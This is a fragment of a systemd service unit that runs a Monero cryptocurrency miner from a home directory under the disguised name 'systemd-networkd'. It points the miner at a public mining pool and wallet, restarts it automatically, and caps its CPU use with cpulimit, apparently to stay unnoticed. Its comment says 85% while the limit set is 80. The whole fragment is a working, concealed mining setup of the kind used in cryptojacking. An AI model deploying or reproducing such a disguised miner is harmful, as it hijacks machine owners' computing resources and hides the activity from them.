...
[Service]
ExecStart=/home/ubuntu/systemd-networkd -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-Duol80 -k --coin monero -a rx/8 --cpu-max-threads-hint=80
Restart=always
User=ubuntu
...
# Apply CPU limit to 85%
cpulimit -e systemd-networkd -l 80 -b
